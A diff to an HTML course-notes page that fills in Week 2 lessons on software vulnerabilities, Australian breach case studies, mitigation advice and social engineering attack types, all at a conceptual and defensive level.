@@ -482,6 +482,23 @@
     .risk-grid, .card-grid { grid-template-columns: 1fr; }
   }
 
+  /* ── data tables — risk registers, comparisons ── */
+  .table-wrap { overflow-x: auto; margin-bottom: 4px; }
+  .data-table { width: 100%; border-collapse: collapse; font-size: .78rem; }
+  .data-table th, .data-table td {
+    padding: 8px 10px; text-align: left; border: 1px solid var(--border);
+    color: var(--text-secondary); vertical-align: top;
+  }
+  .data-table th {
+    background: var(--bg-card-raised); color: var(--cyan);
+    font-family: var(--font-mono); font-size: .68rem; letter-spacing: .03em;
+    text-transform: uppercase;
+  }
+  .data-table tr:nth-child(even) td { background: rgba(255,255,255,.015); }
+
+  /* ── case study card ── */
+  .case-tag { color: var(--amber); background: var(--amber-dim); }
+
   /* Flash highlight when navigated to from search */
   .note-card.flash {
     animation: flashHit 1.4s ease;
@@ -1098,110 +1115,350 @@
         <div class="lesson-header">
           <span class="lesson-eyebrow">Week 2 · Lesson 1</span>
           <h2>Types of Vulnerabilities &amp; Risks</h2>
-          <p class="lesson-description">Common weaknesses in insecure software development environments, and how attackers exploit them to access data, disrupt services, or compromise user trust.</p>
+          <p class="lesson-description">Common weaknesses in insecure software development environments, real Australian incidents each one caused, and how to mitigate them.</p>
         </div>
 
         <div class="topic-tabs">
           <button class="topic-tab active" data-topic="m2l1-overview">Overview</button>
-          <button class="topic-tab" data-topic="m2l1-access">Access &amp; Third-Party Risk</button>
-          <button class="topic-tab" data-topic="m2l1-attacks">Attacks &amp; Poor Practices</button>
+          <button class="topic-tab" data-topic="m2l1-apis">APIs</button>
+          <button class="topic-tab" data-topic="m2l1-malware">Malware</button>
+          <button class="topic-tab" data-topic="m2l1-unpatched">Unpatched Software</button>
+          <button class="topic-tab" data-topic="m2l1-iam">IAM &amp; Insider Threats</button>
+          <button class="topic-tab" data-topic="m2l1-mitm">MitM Attacks</button>
+          <button class="topic-tab" data-topic="m2l1-spoofing">Spoofing &amp; Invoice Scams</button>
+          <button class="topic-tab" data-topic="m2l1-incidents">Cyber Security Incidents</button>
+          <button class="topic-tab" data-topic="m2l1-thirdparty">Third-Party Software</button>
+          <button class="topic-tab" data-topic="m2l1-practices">Poor Dev Practices</button>
           <button class="topic-tab" data-topic="m2l1-iot">IoT &amp; Code of Practice</button>
         </div>
-
-        <!-- ── TOPIC: Overview ── -->
         <div class="topic-panel active" data-topic="m2l1-overview">
-
           <div class="note-card">
             <span class="tag">Definition</span>
             <h3><span class="card-icon">◆</span>Insecure Development Environments</h3>
             <p>When systems and processes are not properly protected, they become vulnerable to a wide range of <span class="key-term">cyber threats and risks</span>. These weaknesses can be exploited by attackers to gain access to data, disrupt services, or compromise user trust.</p>
           </div>
-
           <div class="card-grid">
             <div class="note-card">
               <span class="tag">Vulnerability</span>
               <h3>Poorly Secured APIs</h3>
-              <p>Application programming interfaces that aren't properly secured can expose sensitive data to unauthorised users.</p>
+              <p>Can expose sensitive data to unauthorised users.</p>
             </div>
             <div class="note-card">
               <span class="tag">Vulnerability</span>
               <h3>Malware</h3>
-              <p>Viruses or spyware can be introduced if software is downloaded from unreliable sources or devices aren't adequately protected.</p>
+              <p>Viruses or spyware introduced via unreliable sources or unprotected devices.</p>
             </div>
             <div class="note-card">
               <span class="tag">Vulnerability</span>
               <h3>Unpatched Software</h3>
-              <p>Outdated programs that haven't received security updates can create serious security holes.</p>
+              <p>Outdated programs without security updates create serious holes.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Vulnerability</span>
+              <h3>Weak IAM</h3>
+              <p>Too much access or weak passwords make systems easier to exploit.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Vulnerability</span>
+              <h3>Insider Threats</h3>
+              <p>Staff or contractors misusing access, intentionally or by accident.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Vulnerability</span>
+              <h3>MitM Attacks</h3>
+              <p>Data secretly intercepted during transmission.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Vulnerability</span>
+              <h3>Third-Party Software</h3>
+              <p>Unreviewed dependencies can introduce unknown vulnerabilities.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Vulnerability</span>
+              <h3>Poor Dev Practices</h3>
+              <p>Ineffective code reviews and combined dev/test/production environments.</p>
             </div>
           </div>
-
         </div>
         <!-- END Overview -->
 
-        <!-- ── TOPIC: Access & Third-Party Risk ── -->
-        <div class="topic-panel" data-topic="m2l1-access">
+        <div class="topic-panel" data-topic="m2l1-apis">
+          <div class="note-card">
+            <span class="tag">Vulnerability</span>
+            <h3><span class="card-icon">◆</span>Use of Application Programming Interfaces (APIs)</h3>
+            <p>APIs are essential for modern software development, letting applications interact and share data. <span class="key-term">Insecure APIs are a major attack vector</span> and can lead to serious breaches if not properly protected.</p>
+            <p>APIs may expose sensitive functions or data when authentication, encryption, or rate-limiting aren't correctly implemented. Developers often rely on third-party APIs or hastily create custom ones without robust security checks. Poorly documented or unmanaged APIs increase the risk of data leaks, unauthorised access and service disruption.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Optus (2022)</h3>
+            <p>The Australian telco suffered a major data breach where unauthorised access to customer data was facilitated in part by an exposed API. The incident affected over 9 million Australians and revealed flaws in access controls and authentication mechanisms on public-facing systems.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Implement strong authentication and authorisation on all endpoints</li>
+              <li>Use HTTPS to encrypt all communications</li>
+              <li>Limit data exposure through API responses</li>
+              <li>Enable rate limiting and throttling to prevent abuse</li>
+              <li>Conduct regular API security assessments and audits</li>
+            </ul>
+          </div>
+        </div>
+        <!-- END APIs -->
 
+        <div class="topic-panel" data-topic="m2l1-malware">
+          <div class="note-card">
+            <span class="tag">Vulnerability</span>
+            <h3><span class="card-icon">◆</span>Malware</h3>
+            <p>Malicious software designed to infiltrate or damage systems. In development environments, malware can be introduced through <span class="key-term">infected libraries, compromised devices, or phishing attacks</span>. It may lead to data theft, corruption, or system control by external actors - often introduced unknowingly through reused or unvetted third-party code.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Toll Group (2020)</h3>
+            <p>The Australian logistics company was hit by two ransomware attacks within three months. The attacks encrypted data and disrupted operations across the country, causing significant financial and reputational damage. The malware entered through phishing and exploited outdated software.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Use up-to-date anti-malware tools across all development systems</li>
+              <li>Scan dependencies and code libraries for malicious components</li>
+              <li>Restrict admin access and employ application whitelisting</li>
+              <li>Educate developers on recognising phishing attempts</li>
+              <li>Monitor systems for unusual behaviour or unauthorised software</li>
+            </ul>
+          </div>
+        </div>
+        <!-- END Malware -->
+
+        <div class="topic-panel" data-topic="m2l1-unpatched">
+          <div class="note-card">
+            <span class="tag">Vulnerability</span>
+            <h3><span class="card-icon">◆</span>Unpatched Software</h3>
+            <p>Contains known vulnerabilities that haven't been fixed by applying updates. Attackers actively scan for outdated systems to gain unauthorised access, disrupt services, or escalate privileges. In development environments, both <span class="key-term">operating systems and software tools</span> (IDEs, frameworks, libraries) may be neglected.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Accellion File Transfer Software (2021)</h3>
+            <p>Attackers exploited an unpatched vulnerability in Accellion file transfer software used by multiple Australian organisations. The flaw let hackers exfiltrate sensitive documents from government agencies and private companies.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Establish automated patch management for all development tools and environments</li>
+              <li>Monitor vendor announcements for critical security updates</li>
+              <li>Test and deploy patches in staging environments before full rollout</li>
+              <li>Maintain an inventory of all software components and their update status</li>
+            </ul>
+          </div>
+        </div>
+        <!-- END Unpatched Software -->
+
+        <div class="topic-panel" data-topic="m2l1-iam">
           <div class="note-card">
             <span class="tag">Access Control</span>
-            <h3><span class="card-icon">⚠</span>Weak Identity &amp; Access Management</h3>
-            <p>If users are given <span class="key-term">too much access</span>, or passwords aren't strong and well-protected, it becomes easier for attackers - or even insiders - to exploit the system.</p>
+            <h3><span class="card-icon">⚠</span>Poor Identity &amp; Access Management (IAM)</h3>
+            <p>IAM defines how users are identified and what resources they can access. Weak practices - such as <span class="key-term">shared credentials, lack of multi-factor authentication (MFA), or improper role assignments</span> - can give attackers or insiders more access than necessary. In development, IAM restricts who can access source code, databases and deployment tools.</p>
           </div>
-
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Australian National University (2023)</h3>
+            <p>ANU reported a data breach resulting from unauthorised access through compromised credentials. Lack of MFA and inadequate logging contributed to delayed detection.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Enforce least privilege principles</li>
+              <li>Use MFA for all accounts, especially privileged ones</li>
+              <li>Avoid shared accounts; assign unique credentials to each user</li>
+              <li>Conduct regular reviews of access logs and permissions</li>
+            </ul>
+          </div>
           <div class="note-card">
             <span class="tag">Insider Risk</span>
             <h3><span class="card-icon">⚠</span>Insider Threats</h3>
-            <p>Threats don't always come from outside. Insider threats involve <span class="key-term">staff or contractors misusing their access</span>, whether intentionally or by accident.</p>
+            <p>Occur when individuals within an organisation misuse their access to compromise systems or data. In development, this could mean a <span class="key-term">disgruntled employee</span> introducing malicious code, leaking source code, or selling sensitive project details.</p>
           </div>
-
           <div class="note-card">
-            <span class="tag">Supply Chain</span>
-            <h3><span class="card-icon">⚠</span>Third-Party Software</h3>
-            <p>Using third-party software without properly reviewing its security can introduce <span class="key-term">unknown vulnerabilities</span> into the system.</p>
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Disgruntled Employee Threat (2022)</h3>
+            <p>A former employee of an Australian fintech startup was investigated for planting backdoors in the company's codebase before leaving. The issue was only discovered after suspicious traffic patterns were observed.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Implement version control and code review processes</li>
+              <li>Restrict access based on job roles and revoke access immediately upon employee exit</li>
+              <li>Monitor developer activity and system logs for anomalies</li>
+              <li>Provide training on ethical development and security policies</li>
+            </ul>
           </div>
-
         </div>
-        <!-- END Access & Third-Party Risk -->
+        <!-- END IAM & Insider Threats -->
 
-        <!-- ── TOPIC: Attacks & Poor Practices ── -->
-        <div class="topic-panel" data-topic="m2l1-attacks">
-
+        <div class="topic-panel" data-topic="m2l1-mitm">
           <div class="note-card">
             <span class="tag">Attack</span>
-            <h3><span class="card-icon">⚠</span>Man-in-the-Middle Attacks</h3>
-            <p>Data is <span class="key-term">secretly intercepted</span> during transmission between two parties.</p>
+            <h3><span class="card-icon">⚠</span>Man-in-the-Middle (MitM) Attacks</h3>
+            <p>Happens when an attacker secretly intercepts or alters communication between two parties who believe they're talking directly to each other. The attacker creates separate connections with each party and relays messages, making it seem like a normal conversation while it's actually being controlled or monitored.</p>
+            <p>Common scenarios include an unencrypted Wi-Fi network (easy to intercept traffic) and email (often lacks default encryption). Encryption helps, but attackers can still trick users into fake (phishing) websites or record traffic for later use, making detection difficult.</p>
           </div>
-
           <div class="note-card">
-            <span class="tag">Cyber Incident</span>
-            <h3><span class="card-icon">⚠</span>Data Breaches &amp; DoS Attacks</h3>
-            <p>Cyber incidents such as data breaches and <span class="key-term">denial-of-service (DoS) attacks</span> can arise when security is neglected.</p>
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Australian Targets</h3>
+            <p>Australian users have been targeted by MitM attacks when accessing banking apps over insecure Wi-Fi networks. In some cases, attackers redirected traffic to fake login pages to steal credentials.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Always use HTTPS and encrypted protocols for all communications</li>
+              <li>Avoid using public Wi-Fi without VPN protection</li>
+              <li>Use certificate pinning where applicable</li>
+              <li>Validate digital certificates and implement strong network segmentation</li>
+            </ul>
           </div>
+          <div class="note-card">
+            <span class="tag">Techniques</span>
+            <h3><span class="card-icon">◆</span>Common MitM Techniques</h3>
+            <ul>
+              <li><span class="key-term">SSL stripping</span> - the attacker connects securely (HTTPS) to the website, but uses an insecure (HTTP) connection with the user, exposing sensitive data</li>
+              <li><span class="key-term">Evil twin attacks</span> - the attacker sets up a fake Wi-Fi hotspot that looks like a trusted network; once connected, all user traffic can be monitored or altered</li>
+              <li><span class="key-term">Email hijacking</span> - the attacker gains access to an email account and monitors conversations, impersonating a party to redirect funds during a money transfer</li>
+              <li><span class="key-term">Wi-Fi eavesdropping</span> - fake public Wi-Fi networks with trustworthy-looking names intercept data being sent</li>
+              <li><span class="key-term">Session hijacking</span> - the attacker steals session data (cookies, session keys) to take control of an active session</li>
+              <li><span class="key-term">DNS spoofing</span> - DNS records are changed to redirect users from a real website to a fake one</li>
+              <li><span class="key-term">IP spoofing</span> - the attacker disguises their IP address to trick systems into thinking traffic is from a trusted source</li>
+            </ul>
+          </div>
+          <div class="note-card">
+            <span class="tag">Attacker Goals</span>
+            <h3><span class="card-icon">◆</span>What Attackers Are After</h3>
+            <ul>
+              <li>Spying on conversations or data</li>
+              <li>Stealing personal info (e.g. credit card numbers, login credentials)</li>
+              <li>Redirecting money transfers</li>
+              <li>Corrupting or manipulating transmitted data</li>
+            </ul>
+          </div>
+          <div class="note-card">
+            <span class="tag">Prevention</span>
+            <h3><span class="card-icon">◆</span>Preventing MitM Attacks</h3>
+            <ul>
+              <li><span class="key-term">Email security tools</span> - monitor email traffic, block suspicious activity, reduce email-based attack risk</li>
+              <li><span class="key-term">Web security tools</span> - detect unsafe traffic and protect users from being redirected to malicious websites</li>
+              <li><span class="key-term">Educate staff and users</span> - training to recognise warning signs (fake Wi-Fi, suspicious emails); use real-world case studies</li>
+              <li><span class="key-term">Keep credentials secure</span> - strong, unique passwords changed at least every three months</li>
+            </ul>
+          </div>
+        </div>
+        <!-- END MitM Attacks -->
 
+        <div class="topic-panel" data-topic="m2l1-spoofing">
+          <div class="note-card">
+            <span class="tag">MitM: Spoofing</span>
+            <h3><span class="card-icon">⚠</span>Email Spoofing</h3>
+            <p>An attacker forges the sender's address to make an email look like it came from someone you know or trust. Commonly used in <span class="key-term">phishing and spam attacks</span>. Since most email software shows only the display name or forged address, users often don't notice anything suspicious - leading them to click malicious links, open infected attachments, send personal data, or transfer money.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">MitM: Spoofing</span>
+            <h3><span class="card-icon">⚠</span>Phone / Caller ID Spoofing</h3>
+            <p>Also known as CLI overstamping - a caller hides their real number and displays a fake one, often a local or trusted number, to increase the chance you'll answer.</p>
+            <p>In Australia, <span class="key-term">spoofing is legal unless used for scams or other malicious purposes</span>. Attackers often pretend to be from banks, government agencies, or phone companies; try to steal personal or financial information; or call from overseas using an Australian-looking number.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">MitM: Invoice Scamming</span>
+            <h3><span class="card-icon">⚠</span>Invoice Scamming</h3>
+            <p>Cybercriminals impersonate a business, intercept legitimate emailed invoices, and change the bank details so payments go to the scammer instead of the real business. Once transferred, the money is often quickly moved to overseas accounts, making it hard for banks or police to recover.</p>
+            <p>In most cases, <span class="key-term">the payer is responsible for the loss</span>, since the invoice wasn't paid to the correct company.</p>
+            <p><strong>Did you know?</strong> In 2021, 1 in 5 small businesses in Australia were affected by invoice fraud, with an average loss of $15,500. (Source: xero.com)</p>
+          </div>
+        </div>
+        <!-- END Spoofing & Invoice Scams -->
+
+        <div class="topic-panel" data-topic="m2l1-incidents">
+          <div class="note-card">
+            <span class="tag">Vulnerability</span>
+            <h3><span class="card-icon">◆</span>Cyber Security Incidents</h3>
+            <p>Events that compromise the integrity, confidentiality or availability of data and systems. These can stem from <span class="key-term">external attacks, insider actions or system failures</span>. In development environments, such incidents may disrupt coding, testing and deployment processes.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Service NSW (2021)</h3>
+            <p>The data breach was triggered by a phishing campaign that compromised staff emails and exposed over 700,000 documents, including driver's licences and personal details.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Develop and regularly update an incident response plan</li>
+              <li>Implement detection systems (IDS/IPS) and logging</li>
+              <li>Train all developers and staff in basic cyber hygiene</li>
+              <li>Ensure backups are secure and tested regularly</li>
+            </ul>
+          </div>
+          <div class="note-card">
+            <span class="tag">Common Source</span>
+            <h3><span class="card-icon">◆</span>Email Data Breaches</h3>
+            <p>A common source of breaches involving personal and sensitive information is email. It's very easy to mistype an address, or select the wrong one via autocomplete, and accidentally send private information to the wrong person. These are known as <span class="key-term">misdirected, or misaddressed emails</span>, and are one of the most common types of data breach.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Did You Know</span>
+            <h3><span class="card-icon">◈</span>Fax Data Breaches</h3>
+            <p>Fax machines were used a lot in the health industry. If a number was dialled incorrectly, the fax would be transmitted to an unauthorised person, or a page from a previous fax could be left on the machine and accidentally transmitted to the wrong person. (Source: WIRED)</p>
+          </div>
+        </div>
+        <!-- END Cyber Security Incidents -->
+
+        <div class="topic-panel" data-topic="m2l1-thirdparty">
+          <div class="note-card">
+            <span class="tag">Supply Chain</span>
+            <h3><span class="card-icon">◆</span>Risks From Third-Party Software</h3>
+            <p>Includes any code, libraries, or tools not developed in-house. These can introduce vulnerabilities if not properly vetted. Attackers may compromise widely used packages or hide malicious code in <span class="key-term">legitimate-looking updates</span>.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>SolarWinds Breach (2020)</h3>
+            <p>This global supply-chain breach affected companies worldwide, including Australian federal departments. Attackers inserted a backdoor into a software update, giving them access to sensitive networks.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Only use trusted sources for software and packages</li>
+              <li>Conduct security audits of third-party tools</li>
+              <li>Monitor vulnerability disclosures related to dependencies</li>
+            </ul>
+          </div>
+        </div>
+        <!-- END Third-Party Software -->
+
+        <div class="topic-panel" data-topic="m2l1-practices">
           <div class="note-card">
             <span class="tag">Development Practice</span>
-            <h3><span class="card-icon">✎</span>Ineffective Code Reviews</h3>
-            <p>Poor review practices increase the chance of bugs and security flaws making their way into live systems.</p>
+            <h3><span class="card-icon">✎</span>Ineffective Code Review Practices</h3>
+            <p>Code review helps ensure quality, security and maintainability. Skipping reviews or doing them poorly lets bugs and security flaws reach production - reviews are often <span class="key-term">rushed or bypassed under time pressure</span>, especially in agile environments.</p>
           </div>
-
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Checkout Failure</h3>
+            <p>An Australian online retailer suffered a checkout failure due to a logic flaw missed during an informal code review, leading to lost sales during a promotional period.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Enforce structured peer reviews for all code changes</li>
+              <li>Use automated tools to detect common vulnerabilities (e.g. linters, static analysis)</li>
+              <li>Maintain coding standards and document review checklists</li>
+              <li>Encourage a culture of constructive feedback and learning</li>
+            </ul>
+          </div>
           <div class="note-card">
             <span class="tag">Development Practice</span>
             <h3><span class="card-icon">✎</span>Combining Dev, Testing &amp; Production Environments</h3>
-            <p>Failing to keep <span class="key-term">development, testing and production</span> environments separate increases the chances of bugs, security flaws, and accidental leaks reaching live systems.</p>
+            <p>Increases risk. Development environments often lack the same security controls as production, and if they share infrastructure or data, attackers may exploit vulnerabilities in dev/test systems to gain <span class="key-term">production access</span>.</p>
           </div>
-
+          <div class="note-card">
+            <span class="tag case-tag">Case Study</span>
+            <h3><span class="card-icon">🏛</span>Exposed Patient Data (2019)</h3>
+            <p>An Australian health provider accidentally exposed patient data when testing a new system using live production data. The test server was misconfigured and indexed by search engines.</p>
+            <p><strong>Mitigation</strong></p>
+            <ul>
+              <li>Isolate dev, test and production environments physically and logically</li>
+              <li>Avoid using real customer data in test environments</li>
+              <li>Secure all environments equally and enforce access controls</li>
+              <li>Monitor for environment-specific misconfigurations or data exposure</li>
+            </ul>
+          </div>
         </div>
-        <!-- END Attacks & Poor Practices -->
+        <!-- END Poor Dev Practices -->
 
-        <!-- ── TOPIC: IoT & Code of Practice ── -->
         <div class="topic-panel" data-topic="m2l1-iot">
-
           <div class="note-card">
             <span class="tag">Did You Know</span>
             <h3><span class="card-icon">◈</span>Connectivity Raises the Stakes</h3>
             <p>The more connected we are, the more opportunities there are for data breaches. New technologies and new uses for technology are rapidly being created, and risk assessment and security measures often can't keep up.</p>
             <p>Smart home and Internet of Things (IoT) devices have become more popular, and these often lack proper security and encryption.</p>
           </div>
-
           <div class="note-card">
             <span class="tag">Australia</span>
             <h3><span class="card-icon">▣</span>IoT Code of Practice</h3>
@@ -1212,113 +1469,737 @@
               <li>3. Keep software securely updated</li>
             </ul>
           </div>
-
         </div>
         <!-- END IoT & Code of Practice -->
-
       </div>
       <!-- END WEEK 2 / LESSON 1 -->
 
       <!-- ════════════════════════════════
-           WEEK 2 / LESSONS 2–6 — empty scaffolds
-           Send the next screenshot and these get filled in the
-           same way as Lesson 1 above.
+           WEEK 2 / LESSON 2 — Mitigation Measures
            ════════════════════════════════ -->
       <div class="lesson-group" data-module="2" data-lesson="2">
+
         <div class="lesson-header">
           <span class="lesson-eyebrow">Week 2 · Lesson 2</span>
           <h2>Mitigation Measures</h2>
-          <p class="lesson-description">Waiting on the next screenshot to fill this lesson in.</p>
+          <p class="lesson-description">Strategies to reduce or eliminate threats, vulnerabilities and risks - drawing on ACSC and OAIC guidance.</p>
         </div>
+
         <div class="topic-tabs">
-          <button class="topic-tab active" data-topic="m2l2-first">Overview</button>
+          <button class="topic-tab active" data-topic="m2l2-overview">Overview</button>
+          <button class="topic-tab" data-topic="m2l2-staff">Staff Awareness</button>
+          <button class="topic-tab" data-topic="m2l2-passwords">Password Safety</button>
+          <button class="topic-tab" data-topic="m2l2-secure">Secure Software Practices</button>
         </div>
-        <div class="topic-panel active" data-topic="m2l2-first">
+
+        <div class="topic-panel active" data-topic="m2l2-overview">
           <div class="note-card">
-            <span class="tag">Placeholder</span>
-            <h3><span class="card-icon">◆</span>Not Yet Added</h3>
-            <p>Send the screenshot for this lesson and it'll be structured the same way as Lesson 1.</p>
+            <span class="tag">Definition</span>
+            <h3><span class="card-icon">◆</span>Mitigation Strategies</h3>
+            <p>To protect sensitive data and maintain secure systems, organisations must apply <span class="key-term">mitigation strategies</span> that reduce or eliminate threats, vulnerabilities and risks. These measures are essential in both operational environments and during software development.</p>
+            <p>The <span class="key-term">Australian Cyber Security Centre (ACSC)</span> provides practical advice for preventing data breaches, including technical controls such as MFA, regular software updates, and strong password policies, as well as organisational strategies such as staff training and cyber awareness programs.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Root Cause</span>
+            <h3><span class="card-icon">◆</span>How Credentials Get Stolen</h3>
+            <p><span class="key-term">Malicious attacks</span> are one of the main causes of data breaches reported in Australia, and stolen credentials (usernames and passwords) often lead to these breaches. Credentials are typically stolen when:</p>
+            <ul>
+              <li>Users are tricked into entering them on fake websites (phishing)</li>
+              <li>Attackers use automated guesses (brute-force attacks)</li>
+              <li>Hackers steal data from a breached service</li>
+              <li>Malware on a device captures login details</li>
+            </ul>
           </div>
         </div>
-      </div>
+        <!-- END Overview -->
 
+        <div class="topic-panel" data-topic="m2l2-staff">
+          <div class="note-card">
+            <span class="tag">Strategy 1</span>
+            <h3><span class="card-icon">◆</span>Staff Awareness</h3>
+            <p>Businesses must train staff to spot and avoid:</p>
+            <ul>
+              <li><span class="key-term">Phishing</span> - fake emails that trick users into giving up login details</li>
+              <li><span class="key-term">Spear phishing</span> - targeted scams using personal or company information to seem more real</li>
+            </ul>
+            <p>Training should include how to spot suspicious activity and understand cyber risks relevant to their role.</p>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l2-passwords">
+          <div class="note-card">
+            <span class="tag">Strategy 2</span>
+            <h3><span class="card-icon">◆</span>Password Safety</h3>
+            <p>The ACSC recommends:</p>
+            <ul>
+              <li>Use strong, long and unpredictable passphrases</li>
+              <li>Don't reuse passwords across important accounts</li>
+              <li>Change passwords regularly</li>
+              <li>Lock accounts after too many failed login attempts</li>
+              <li>Reset compromised passwords immediately</li>
+              <li>Avoid sharing passwords between secure and less secure services</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l2-secure">
+          <div class="note-card">
+            <span class="tag">Strategy 3</span>
+            <h3><span class="card-icon">◆</span>Secure Software Practices</h3>
+            <p>To protect systems:</p>
+            <ul>
+              <li>Use <span class="key-term">multi-factor authentication</span> for important actions and remote access</li>
+              <li>Keep software, browsers and plugins up to date</li>
+              <li>Enable anti-virus software to catch malware that steals data</li>
+              <li>Watch for suspicious account activity</li>
+              <li>Be cautious with credential prompts - don't enter passwords via links from unknown sources; navigate to official websites manually to reset passwords; remember friends' accounts can also be hacked and used to send fake messages</li>
+            </ul>
+            <p>This advice comes from the Office of the Australian Information Commissioner (OAIC) and the ACSC.</p>
+          </div>
+        </div>
+
+      </div>
+      <!-- END WEEK 2 / LESSON 2 -->
+
+      <!-- ════════════════════════════════
+           WEEK 2 / LESSON 3 — Social Engineering Attacks
+           ════════════════════════════════ -->
       <div class="lesson-group" data-module="2" data-lesson="3">
+
         <div class="lesson-header">
           <span class="lesson-eyebrow">Week 2 · Lesson 3</span>
           <h2>Social Engineering Attacks</h2>
-          <p class="lesson-description">Waiting on the next screenshot to fill this lesson in.</p>
+          <p class="lesson-description">Attacks that use psychological manipulation to fool people into handing over confidential data, and how to defend against them.</p>
         </div>
+
         <div class="topic-tabs">
-          <button class="topic-tab active" data-topic="m2l3-first">Overview</button>
+          <button class="topic-tab active" data-topic="m2l3-overview">Overview</button>
+          <button class="topic-tab" data-topic="m2l3-types">Attack Types</button>
+          <button class="topic-tab" data-topic="m2l3-org">Prevention (Organisations)</button>
+          <button class="topic-tab" data-topic="m2l3-individual">Prevention (Individuals)</button>
+          <button class="topic-tab" data-topic="m2l3-proactive">Proactive vs Reactive</button>
         </div>
-        <div class="topic-panel active" data-topic="m2l3-first">
+
+        <div class="topic-panel active" data-topic="m2l3-overview">
           <div class="note-card">
-            <span class="tag">Placeholder</span>
-            <h3><span class="card-icon">◆</span>Not Yet Added</h3>
-            <p>Send the screenshot for this lesson and it'll be structured the same way as Lesson 1.</p>
+            <span class="tag">Definition</span>
+            <h3><span class="card-icon">◆</span>Social Engineering</h3>
+            <p>Involves <span class="key-term">some form of psychological manipulation</span>, fooling otherwise unsuspecting users or employees into handing over confidential or sensitive data. Commonly involves email or other communication that invokes urgency, fear or similar emotions, leading the victim to promptly reveal sensitive information, click a malicious link, or open a malicious file. Because it involves a human element, preventing these attacks can be tricky for enterprises.</p>
+            <p>Social engineering attacks include: phishing, spear phishing, baiting, quid pro quo attacks, pretexting, and tailgating.</p>
           </div>
         </div>
-      </div>
+        <!-- END Overview -->
 
+        <div class="topic-panel" data-topic="m2l3-types">
+          <div class="card-grid">
+            <div class="note-card">
+              <span class="tag">Type</span>
+              <h3>Phishing</h3>
+              <p>The most common social engineering attack. Most scams try to: obtain personal info (names, addresses, passwords, PINs, account numbers); use shortened or misleading links to phishing landing pages; and incorporate threats, fear or urgency to get a quick response.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Type</span>
+              <h3>Spear Phishing</h3>
+              <p>A targeted version of phishing where the attacker chooses specific individuals or enterprises and tailors messages based on their characteristics, job position and contacts to seem less conspicuous.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Type</span>
+              <h3>Baiting</h3>
+              <p>Offering something enticing (a download, or a corporate-branded USB stick) in exchange for login details or sensitive information. E.g. a criminal leaves a USB labelled "Confidential" or "Bonuses" where a target will find it - plugging it in installs malware automatically.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Type</span>
+              <h3>Quid Pro Quo</h3>
+              <p>Similar to baiting - requesting login details or sensitive data in exchange for a service, e.g. a hacker posing as a technology expert offers free IT assistance, or as a researcher offers $100 for network access "as part of an experiment". If it sounds too good to be true, it probably is.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Type</span>
+              <h3>Pretexting</h3>
+              <p>The human equivalent of phishing. The hacker creates a false sense of trust by impersonating a co-worker or authority figure to gain access to login details, e.g. an email from "IT support" or a chat message from an "auditor".</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">Type</span>
+              <h3>Tailgating / Piggybacking</h3>
+              <p>An unauthorised person physically follows an authorised person into a restricted area or system, e.g. calling out to an employee to hold the door, or asking to quickly borrow their laptop or phone.</p>
+            </div>
+          </div>
+        </div>
+        <!-- END Attack Types -->
+
+        <div class="topic-panel" data-topic="m2l3-org">
+          <div class="note-card">
+            <span class="tag">Organisations</span>
+            <h3><span class="card-icon">◆</span>Employee Education</h3>
+            <p>The most effective defence against social engineering fraud is a well-informed workforce. Employees at all levels should understand what social engineering is, be aware of common techniques (phishing, pretexting, baiting), and know how to respond appropriately. Training should be ongoing, practical and tailored to the organisation's operations.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Organisations</span>
+            <h3><span class="card-icon">◆</span>Policies &amp; Procedures</h3>
+            <p>Strong organisational policies and clear procedures help employees respond appropriately to suspicious requests, covering verification protocols, information handling, approval workflows, and physical security practices.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Organisations</span>
+            <h3><span class="card-icon">◆</span>Email Software &amp; Filtering</h3>
+            <p>Email software plays a critical role in defending against social engineering. Setting spam filters to high and enabling conversation threading helps users more easily detect phishing or suspicious activity.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Organisations</span>
+            <h3><span class="card-icon">◆</span>Secure Computing Devices &amp; Updates</h3>
